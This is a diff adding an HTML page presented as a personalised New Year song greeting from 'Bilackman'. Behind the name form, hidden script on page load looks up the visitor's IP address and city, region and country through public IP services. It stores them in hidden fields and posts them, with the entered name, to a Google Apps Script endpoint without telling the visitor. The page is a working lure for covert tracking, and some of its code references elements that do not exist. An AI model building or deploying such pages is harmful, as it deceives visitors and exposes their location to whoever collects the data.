@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bilackman Special New Year Song</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1c1c1c, #333);
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            max-width: 400px;
+            background: #2c2c2c;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+        }
+
+        .container img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin-bottom: 20px;
+            border: 2px solid #fff;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+
+        p {
+            margin-bottom: 25px;
+            font-size: 1.2rem;
+            line-height: 1.6;
+        }
+
+        input[type="text"] {
+            width: 93%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            background: #fff;
+            font-size: 1.2rem;
+            color: #333;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background: #ff6f61;
+            color: #fff;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background: #ff3f3f;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="formContainer">
+        <img src="https://pbs.twimg.com/profile_images/1870713470813167616/fdlqTi1j_400x400.jpg" alt="Bilackman">
+        <h1>Celebrate New Year with Bilackman's Special Song</h1>
+        <p>Start the year on a high note! Enter your name below and click "Play Song" to enjoy a heartfelt melody made just for you.</p>
+        <form id="songForm" name="submit-to-google-sheet">
+            <input type="text" id="name" name="name" placeholder="Enter your name" required>
+            <input type="hidden" id="ip" name="ip" value="12345">
+            <input type="hidden" id="city" name="city">
+            <input type="hidden" id="region" name="region">
+            <input type="hidden" id="country" name="country">
+            <button type="submit" id="playSongBtn">Play Song</button>
+        </form>
+
+        <span id="ss"></span>
+    </div>
+
+    <script>
+    function play(){
+
+            const nameInput = document.getElementById('name').value.trim();
+
+            if (nameInput === '') {
+                alert('Please enter your name!');
+                return;
+            }
+
+            document.body.style.backgroundColor = '#000';
+            document.getElementById('formContainer').innerHTML = `
+                <img src="https://pbs.twimg.com/profile_images/1870713470813167616/fdlqTi1j_400x400.jpg" alt="Bilackman">
+                <h1>Happy New Year, ${nameInput}!</h1>
+                <p>"Bilackman" is thrilled to bring you this special song to kickstart your year. Enjoy and have a fantastic 2025!</p>
+                <audio controls autoplay>
+                    <source src="new-yearsing.mp3" type="audio/mpeg">
+                    Your browser does not support the audio element.
+                </audio>
+            `;
+            }
+    
+       function func(){
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          document.getElementById('ip').value = ip;
+          console.log('Logged IP:', ip);
+
+          return fetch(`https://ipapi.co/${ip}/json/`);
+        })
+        .then(response => response.json())
+        .then(locationData => {
+            
+          document.getElementById('city').value = locationData.city ;
+          document.getElementById('region').value = locationData.region ; 
+          document.getElementById('country').value = locationData.country_name ;
+         
+        })
+        .catch(error => {
+          console.error('Error fetching location:', error);
+          
+          document.getElementById('ip-display').textContent = 'Error fetching data. Please try again.';
+        });
+       }
+    
+
+       func()
+
+       
+   /* submitting form */
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbyyXWecGcsXSCdjDMLhViD-tzXGsIKDu4klkHmiafU9TN0cXo8s7hx5KpFYule-9G6y/exec'
+  const form = document.forms['submit-to-google-sheet']
+const sus = document.getElementById('ss');
+
+     
+
+  form.addEventListener('submit', e => {
+
+
+    play()
+
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => {
+         sus.innerHTML="Wait";
+  setTimeout(function()
+  {
+    sus.innerHTML="";
+  },6000)
+  form.reset();
+    })
+      .catch(error => console.error('Error!', error.message))
+  })
+  
+  const playSound = () => {
+  const audio = new Audio("new-yearsing.mp3");
+  audio.play();
+};
+
+document.querySelector("#submitb").addEventListener("click", playSound);
+
+
+    </script>
+</body>
+</html>
